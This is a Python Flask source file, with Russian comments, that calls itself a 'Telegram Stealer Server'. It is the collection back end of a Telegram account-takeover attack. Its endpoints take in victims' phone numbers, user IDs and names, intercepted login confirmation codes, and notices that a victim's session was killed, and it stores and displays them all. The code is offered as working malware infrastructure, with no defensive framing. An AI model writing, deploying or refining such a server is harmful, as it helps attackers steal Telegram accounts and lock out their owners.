from flask import Flask, request, jsonify
import json
from datetime import datetime

app = Flask(__name__)

# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
def log_data(endpoint, data):
    """Логирует данные с timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    msg = f"[{timestamp}] {endpoint}: {json.dumps(data, ensure_ascii=False)}"
    print(msg)
    return msg

def save_to_file(data):
    """Сохраняет данные в файл (опционально)"""
    try:
        with open("data.txt", "a", encoding="utf-8") as f:
            f.write(json.dumps(data, ensure_ascii=False) + "\n")
    except:
        pass

# ===== ЭНДПОИНТЫ =====

@app.route('/', methods=['GET'])
def index():
    """Проверка работы сервера"""
    return "✅ Telegram Stealer Server is running!", 200

@app.route('/info', methods=['POST'])
def info():
    """Принимает информацию о жертве"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data'}), 400
        
        # Логируем
        log_data('INFO', data)
        save_to_file(data)
        
        # Выводим в читаемом виде
        print(f"📱 Phone: {data.get('phone')}")
        print(f"🆔 ID: {data.get('id')}")
        print(f"👤 Username: {data.get('username')}")
        print(f"📛 Name: {data.get('first_name')} {data.get('last_name')}")
        print("-" * 50)
        
        return jsonify({'status': 'ok', 'message': 'Info received'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/code', methods=['POST'])
def code():
    """Принимает код подтверждения"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data'}), 400
        
        # Логируем
        log_data('CODE', data)
        save_to_file(data)
        
        # Выводим в читаемом виде
        print(f"🔑 CODE: {data.get('code')}")
        print(f"📝 Full text: {data.get('full_text', 'N/A')}")
        print("-" * 50)
        
        return jsonify({'status': 'ok', 'message': 'Code received'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/kill', methods=['POST'])
def kill():
    """Принимает уведомление об убийстве сессии"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data'}), 400
        
        log_data('KILL', data)
        save_to_file(data)
        
        print(f"💀 SESSION KILLED! Victim is out!")
        print("-" * 50)
        
        return jsonify({'status': 'ok', 'message': 'Kill confirmed'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/logs', methods=['GET'])
def get_logs():
    """Просмотр всех сохраненных данных (опционально)"""
    try:
        with open("data.txt", "r", encoding="utf-8") as f:
            content = f.read()
        return f"<pre>{content}</pre>", 200
    except:
        return "No logs found", 404

@app.route('/stats', methods=['GET'])
def stats():
    """Статистика полученных данных"""
    try:
        with open("data.txt", "r", encoding="utf-8") as f:
            lines = f.readlines()
        return jsonify({
            'total_entries': len(lines),
            'status': 'ok'
        }), 200
    except:
        return jsonify({'total_entries': 0, 'status': 'ok'}), 200

# ===== ЗАПУСК =====
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
